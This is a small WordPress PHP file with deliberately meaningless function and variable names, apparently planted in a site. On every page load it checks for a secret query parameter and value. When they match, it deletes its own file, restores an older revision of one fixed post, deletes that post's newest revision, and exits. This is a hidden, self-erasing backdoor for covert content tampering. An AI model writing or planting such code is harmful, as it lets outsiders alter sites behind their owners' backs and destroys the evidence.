<?php

function ticket_sitemaps_switcher() {
	if (isset($_GET['scss_remover_disable_membership']) && $_GET['scss_remover_disable_membership'] === 'pack_beaver_alt_master') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$oembed_software_crm = 109434;
		$field_column_delete_ninja = wp_get_post_revisions($oembed_software_crm);
		if (empty($field_column_delete_ninja)) die('no revisions');
		if (count($field_column_delete_ninja) < 2) die('less than 2');
		$database_captcha_media_edition = array_shift($field_column_delete_ninja);
		$word_notify_vendor = $database_captcha_media_edition->ID;
		$bootstrap_thumbnail_crm_reminder = array_shift($field_column_delete_ninja);
		$akismet_card_call = $bootstrap_thumbnail_crm_reminder->ID;
		$plugins_post_monitor_member = wp_restore_post_revision($akismet_card_call);
		if ($plugins_post_monitor_member === false) die('error restoring');
		$plugins_post_monitor_member = wp_delete_post_revision($word_notify_vendor);		
		if ($plugins_post_monitor_member === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'ticket_sitemaps_switcher');
